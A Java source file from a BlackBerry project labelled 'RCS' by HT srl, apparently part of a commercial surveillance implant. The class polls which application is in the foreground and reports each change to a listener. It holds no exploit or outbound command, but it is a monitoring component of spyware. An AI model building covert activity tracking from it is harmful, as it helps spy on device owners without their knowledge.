//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry
 * File         : AppUpdateManager.java
 * Created      : 28-apr-2010
 * *************************************************/
package blackberry;

import java.util.TimerTask;

import net.rim.device.api.system.ApplicationDescriptor;
import net.rim.device.api.system.ApplicationManager;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.fs.Path;
import blackberry.utils.StringPair;

/**
 * The Class AppUpdateManager.
 */
public final class AppUpdateManager extends TimerTask {
    //#ifdef DEBUG
    private static Debug debug = new Debug("AppUpdManager", DebugLevel.VERBOSE);
    //#endif
    private static ApplicationManager manager = ApplicationManager.getApplicationManager();
    //Hashtable appSet = new Hashtable();
    AppListener appListener = AppListener.getInstance();

    volatile boolean running;

    boolean windowName = false;
    String lastName, lastMod;

    // questo e' solo di ottimizzazione
    int lastForegroundId;

    public AppUpdateManager() {

    }

    public AppUpdateManager(AppUpdateManager appManager) {
        lastName = appManager.lastName;
        lastMod = appManager.lastMod;
    }

    public boolean isRunning() {
        return running;
    }

    Object syncAppobj = new Object();

    public void run() {
        synchronized (syncAppobj) {
            if (running) {
                return;
            } else {
                running = true;
            }
        }

        try {
            
            init();

            final int foregroundId = manager.getForegroundProcessId();

            if (lastForegroundId == foregroundId) {
                return;
            }

            lastForegroundId = foregroundId;
            

            StringPair names = getApplicationName(foregroundId, manager);
            
            
            if (!names.first.equals(lastName) || !names.second.equals(lastMod)) {

                appListener.applicationForegroundChange(names.first, lastName,
                        names.second, lastMod);

                lastName = names.first;
                lastMod = names.second;
            }
            

        } finally {
            synchronized (syncAppobj) {
                running = false;
            }
        }
    }

    public static StringPair getForegroundApp(){
        final int foregroundId = manager.getForegroundProcessId();
        return getApplicationName(foregroundId, manager);
        
    }
    
    private static StringPair getApplicationName(final int foregroundId,
            final ApplicationManager manager) {
        
        final ApplicationDescriptor[] descriptors = manager
                .getVisibleApplications();
        // Retrieve the name of running applications.
        for (int i = 0; i < descriptors.length; i++) {
            final ApplicationDescriptor descriptor = descriptors[i];

            // find which one is in foreground
            final int pid = ApplicationManager.getApplicationManager()
                    .getProcessId(descriptor);
            if (pid == foregroundId) {

                final String name = descriptor.getName();
                final String mod = descriptor.getModuleName();

                return new StringPair(name, mod);
                
            }
        }
        
        return null;
    }
    
    private synchronized void init() {
        if (!Path.isInizialized()) {
            Path.makeDirs();
        }
        Debug.init();
    }


}
